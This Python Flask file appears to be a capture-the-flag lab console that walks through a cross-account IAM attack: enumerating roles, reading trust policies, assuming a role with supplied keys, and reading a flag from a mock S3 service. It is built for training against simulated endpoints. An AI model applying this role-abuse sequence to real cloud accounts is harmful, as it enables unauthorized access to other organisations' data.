"""Cross-Account Trust Attack — enumerate roles and abuse trust policies."""
import os, urllib.request, json, urllib.parse
from flask import Flask, request, render_template_string

app = Flask(__name__)
IAM = os.environ.get("IAM_URL", "http://iam:5000")

HTML="""<!DOCTYPE html><html><head><title>Cross-Account Attack</title></head><body>
<h1>Cross-Account Trust Attack Console</h1>
<div style="background:#f0f0f0;padding:10px;margin:10px 0">
<strong>Step 1: List Roles</strong> — Enumerate IAM roles in the target account.
<form method=post action=/step1><button>List Roles</button></form></div>
<div style="background:#f0f0f0;padding:10px;margin:10px 0">
<strong>Step 2: Get Role Details</strong> — View trust policy for a specific role.
<form method=post action=/step2>
<label>Role Name: <input name=role placeholder="CrossAccountRole"></label>
<button>Get Role</button></form></div>
<div style="background:#f0f0f0;padding:10px;margin:10px 0">
<strong>Step 3: Assume Role</strong> — Attempt to assume a cross-account role.
<form method=post action=/step3>
<label>Role ARN: <input name=arn size=55 placeholder="arn:aws:iam::111111111111:role/CrossAccountRole"></label><br>
<label>Access Key: <input name=ak placeholder="AKIA..."></label><br>
<label>Secret Key: <input name=sk placeholder="secret..."></label><br>
<button>Assume Role</button></form></div>
<div style="background:#f0f0f0;padding:10px;margin:10px 0">
<strong>Step 4: Access S3</strong> — Use assumed role credentials to read flag.
<form method=post action=/step4>
<label>Access Key: <input name=ak placeholder="ASIA..."></label><br>
<label>Secret Key: <input name=sk placeholder="temp-sk-..."></label><br>
<label>Token: <input name=token placeholder="FwoG..."></label><br>
<button>Get Flag</button></form></div>
<pre>{{output}}</pre></body></html>"""

@app.route("/")
def home(): return render_template_string(HTML, output="Ready — follow the steps above")

@app.route("/step1", methods=["POST"])
def step1():
    try:
        r = urllib.request.urlopen(f"{IAM}/roles", timeout=5)
        roles = json.loads(r.read().decode())
        return render_template_string(HTML, output=f"[+] Available roles:\n{json.dumps(roles, indent=2)}\n\n[→] Look for roles with cross-account trust policies.")
    except Exception as e:
        return render_template_string(HTML, output=f"[-] Error: {e}")

@app.route("/step2", methods=["POST"])
def step2():
    role_name = request.form.get("role", "")
    if not role_name:
        return render_template_string(HTML, output="Error: role name required")
    try:
        r = urllib.request.urlopen(f"{IAM}/roles/{role_name}", timeout=5)
        role_data = json.loads(r.read().decode())
        return render_template_string(HTML, output=f"[+] Role details:\n{json.dumps(role_data, indent=2)}\n\n[→] Check the trust_policy Principal to see if cross-account access is allowed.")
    except urllib.error.HTTPError as e:
        return render_template_string(HTML, output=f"[-] Error ({e.code}): {e.read().decode()}")
    except Exception as e:
        return render_template_string(HTML, output=f"[-] Error: {e}")

@app.route("/step3", methods=["POST"])
def step3():
    arn = request.form.get("arn", "")
    ak = request.form.get("ak", "")
    sk = request.form.get("sk", "")
    if not all([arn, ak, sk]):
        return render_template_string(HTML, output="Error: role ARN, access key, and secret key required")
    try:
        body = urllib.parse.urlencode({
            "Action": "AssumeRole",
            "RoleArn": arn,
            "RoleSessionName": "cross-account-attack",
            "AccessKeyId": ak,
            "SecretAccessKey": sk,
        })
        r = urllib.request.urlopen(urllib.request.Request(
            f"{IAM}/", data=body.encode(),
            headers={"Content-Type": "application/x-www-form-urlencoded"}),
            timeout=10)
        return render_template_string(HTML, output=f"[+] AssumeRole response:\n{r.read().decode()}\n\n[→] Copy the AccessKeyId, SecretAccessKey, and SessionToken for Step 4.")
    except urllib.error.HTTPError as e:
        return render_template_string(HTML, output=f"[-] IAM error ({e.code}): {e.read().decode()}")
    except Exception as e:
        return render_template_string(HTML, output=f"[-] Error: {e}")

@app.route("/step4", methods=["POST"])
def step4():
    ak = request.form.get("ak", "")
    sk = request.form.get("sk", "")
    token = request.form.get("token", "")
    if not all([ak, sk, token]):
        return render_template_string(HTML, output="Error: all credential fields required")
    try:
        r = urllib.request.urlopen(urllib.request.Request(
            "http://s3:5000/flag.txt",
            headers={"X-Access-Key-Id": ak, "X-Secret-Access-Key": sk, "X-Session-Token": token}),
            timeout=5)
        return render_template_string(HTML, output=f"[+] S3 flag.txt:\n{r.read().decode()}")
    except Exception as e:
        return render_template_string(HTML, output=f"[-] Error accessing S3: {e}")

if __name__ == "__main__": app.run(host="0.0.0.0", port=5000)
